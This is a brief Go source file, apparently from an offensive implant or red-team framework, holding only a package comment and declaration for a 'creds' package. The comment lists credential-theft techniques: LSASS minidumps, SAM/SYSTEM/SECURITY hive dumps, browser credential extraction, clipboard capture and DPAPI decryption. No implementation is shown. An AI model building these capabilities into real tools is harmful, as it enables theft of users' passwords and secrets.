// Package creds provides credential access techniques for the agent implant.
//
// Techniques:
//   - LSASS minidump (MiniDumpWriteDump + handle duplication)
//   - SAM/SYSTEM/SECURITY registry hive dump (RegSaveKeyW + VSS fallback)
//   - Browser credential extraction (Chromium/Firefox)
//   - Clipboard data capture
//   - DPAPI CryptUnprotectData
//
// All Windows-specific code is gated behind //go:build windows build tags.
package creds
